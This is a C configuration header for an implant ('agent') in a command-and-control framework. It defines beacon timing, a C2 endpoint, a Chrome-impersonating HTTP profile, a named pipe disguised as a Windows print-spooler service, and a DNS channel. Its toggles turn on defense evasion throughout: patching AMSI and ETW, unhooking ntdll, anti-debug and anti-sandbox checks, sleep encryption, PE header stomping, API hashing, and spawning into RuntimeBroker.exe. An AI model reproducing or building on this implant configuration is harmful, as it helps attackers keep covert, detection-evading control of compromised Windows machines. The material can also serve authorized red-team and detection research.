/*
 * config.h — Build-time configuration for the C agent.
 * Values are patched by scripts/build_agent_c.py during generation.
 * DO NOT edit manually — use the 'generate' command in the operator shell.
 */
#ifndef CONFIG_H
#define CONFIG_H

/* ─── C2 endpoint ─── */
#define CONFIG_C2_URL       "https://127.0.0.1:8443/api/v1"

/* ─── Beacon timing ─── */
#define CONFIG_SLEEP_MS     60000
#define CONFIG_JITTER_PCT   25

/* ─── Kill date (Unix timestamp, 0 = disabled) ─── */
#define CONFIG_KILL_DATE    0

/* ─── Packet magic (4 bytes LE) ─── */
#define CONFIG_MAGIC        0xDEADF00D

/* ─── Agent version ─── */
#define CONFIG_AGENT_VER    "1.0.0"

/* ─── HTTP profile ─── */
#define CONFIG_COOKIE_NAME  "session"
#define CONFIG_URI_PATH     "/api/v1"
#define CONFIG_USER_AGENT   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

/* ─── SMB named pipe ─── */
#define CONFIG_PIPE_NAME    "\\\\.\\pipe\\spoolsvc"
#define CONFIG_PIPE_ENABLED 0  /* 0 = disabled, 1 = listen (server), 2 = connect (client) */
#define CONFIG_PIPE_HOST    ""  /* For client mode: target hostname. Empty = local. */

/* ─── DNS channel ─── */
#define CONFIG_DNS_DOMAIN   ""  /* C2 domain for DNS channel, e.g. "c2.example.com" */
#define CONFIG_DNS_ENABLED  0   /* 0 = disabled, 1 = enabled */

/* ─── Channel priority (comma-separated: http,smb,dns) ─── */
#define CONFIG_CHANNEL_PRIORITY  "http"
#define CONFIG_CHANNEL_MAX_FAILURES  5

/* ─── Evasion toggles ─── */
#define CONFIG_ANTI_DEBUG       1   /* 1 = check for debuggers at startup */
#define CONFIG_ANTI_SANDBOX     1   /* 1 = check for sandbox/VM at startup */
#define CONFIG_PATCH_AMSI       1   /* 1 = patch AmsiScanBuffer on init */
#define CONFIG_PATCH_ETW        1   /* 1 = patch EtwEventWrite on init */
#define CONFIG_UNHOOK_NTDLL     1   /* 1 = restore ntdll.dll .text from disk */
#define CONFIG_SLEEP_OBFUSCATE  1   /* 1 = Ekko-style sleep encryption */
#define CONFIG_STACK_SPOOF      0   /* 1 = spoof thread stack during sleep */
#define CONFIG_INDIRECT_SYSCALLS 0  /* 1 = use indirect syscalls (Hell's Gate) */
#define CONFIG_PE_STOMP         1   /* 1 = stomp PE headers after init */
#define CONFIG_API_HASHING      1   /* 1 = resolve sensitive APIs via PEB walk + DJB2 */
#define CONFIG_MODULE_STOMP     0   /* 1 = use module stomping for payload loading */

/* ─── Fork & run defaults ─── */
#define CONFIG_SPAWN_TO         L"C:\\Windows\\System32\\RuntimeBroker.exe"
#define CONFIG_FORK_TIMEOUT_MS  30000

/* ─── Response wrapper (malleable profile) ─── */
#define CONFIG_RESP_WRAPPER_BEFORE  "<html><body><div style=\"display:none\">\n"
#define CONFIG_RESP_WRAPPER_AFTER   "\n</div></body></html>\n"

/* ─── RSA-2048 public key components ───
 * Modulus: 256 bytes, Exponent: typically 3 bytes (65537)
 * Patched by build script from keys/server_pub.pem
 */
static const unsigned char RSA_MODULUS[] = {
    0x00  /* placeholder — replaced at build time */
};
static const unsigned int RSA_MODULUS_LEN = 1;

static const unsigned char RSA_EXPONENT[] = { 0x01, 0x00, 0x01 };
static const unsigned int RSA_EXPONENT_LEN = 3;

#endif /* CONFIG_H */
